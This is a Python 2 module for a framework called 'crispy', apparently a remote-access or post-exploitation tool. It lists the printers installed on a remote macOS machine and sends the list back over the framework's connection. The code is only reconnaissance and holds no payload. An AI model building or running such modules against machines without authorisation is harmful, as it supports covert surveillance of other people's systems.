import cPickle
import logging

from crispy.lib.myparser import CrispyArgumentParser
from crispy.lib.module import *
from crispy.lib.fprint import *

logger = logging.getLogger(__name__)

__class_name__ = "PrintersModule"
class PrintersModule(CrispyModule):
    """ Enum printers on a remote machine. """

    # can be: 'darwin', 'nt', 'android'
    compatible_systems = ['darwin']

    #def init_argparse(self):
    #    self.parser = CrispyArgumentParser(prog="printers", description=self.__doc__)
    #    self.parser.add_argument()

    def marshall_me(self):
        import os
        
        info = "\n"
        printers = os.listdir('/private/etc/cups/ppd/')
        for printer in printers:
            info += "{}\n".format(printer[:-4])
        return info

    def run(self, args):
        logger.debug("apps () was called.")
        info("Getting installed printers now...")
        if (self.is_compatible()):
            try:
                data = cPickle.dumps(self.marshall_me(), -1)
                self.client.conn.sendall(data)
                print self.client.conn.recv(1024)
                success("Done.")
            except Exception as e:
                logger.error("{}: {}".format(__class_name__, e))
                error(e)
        else:
            error("OS not implmented yet... help me code it?")
